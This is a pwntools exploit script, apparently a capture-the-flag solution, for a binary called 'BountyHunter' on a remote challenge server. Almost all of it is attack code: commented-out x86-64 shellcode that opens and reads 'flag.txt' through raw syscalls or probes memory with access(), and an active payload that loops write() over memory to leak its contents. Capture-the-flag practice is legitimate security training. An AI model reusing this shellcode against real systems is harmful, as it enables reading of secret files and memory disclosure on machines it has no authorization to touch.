from pwn import *
from icecream import ic

elf = exe = ELF("./BountyHunter")

context.binary = exe
context.log_level = "debug"
context.aslr = True
context.arch = 'x86-64'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("pwn.1nf1n1ty.team", 31681)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001523
b *main
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def gad(a, b): return ROP(a).find_gadget([f"pop {b}", "ret"])[0]
def i(): return io.interactive()

io = start()

# sl(b'a')

# payload = asm('''
#     mov rax, 1
#     mov rdi, 1
#     mov rdx, 200
#     mov rsi, 
#     syscall
              
# ''')

# payload = asm('''mov dword ptr [rsp], 0x67616c66
# mov dword ptr [rsp+4], 0x7478742e

# lea rdi, [rsp]
# mov rax, 2
# xor rsi, rsi
# xor rdx, rdx
# syscall

# mov rdi, rax
# lea rsi, [rsp]
# mov rdx, 200
# xor rax, rax
# syscall

# mov rdi, 1
# lea rsi, [rsp]
# mov rdx, rax
# mov rax, 1
# syscall
# ''')

# payload = asm('''
#     mov rdi, 0x1000000
#     do:
#         mov rax, 21
#         mov rsi, 0
#         syscall
#         cmp rax, 0 
#         je done
#         add rdi, 0x1000
#         jmp do
#     done:
#         mov rsi, rdi
#         mov rdi, 1
#         mov rdx, 0x100
#         mov rax, 1
#         syscall
# ''')
payload = asm('''
    mov rsi, 0x1000000
    do:
        mov rax, 1
        mov rdi, 1
        mov rdx, 0x100
        syscall
        add rsi, 0x1000
        jmp do
''')
# payload = asm('''
#     mov dword ptr [rsp], 0x67616c66
#     mov dword ptr [rsp+4], 0x7478742e

#     lea rdi, [rsp]
#     mov rax, 21
#     mov rsi, 0
#     syscall
#               ''')

sl(payload)
io.interactive()
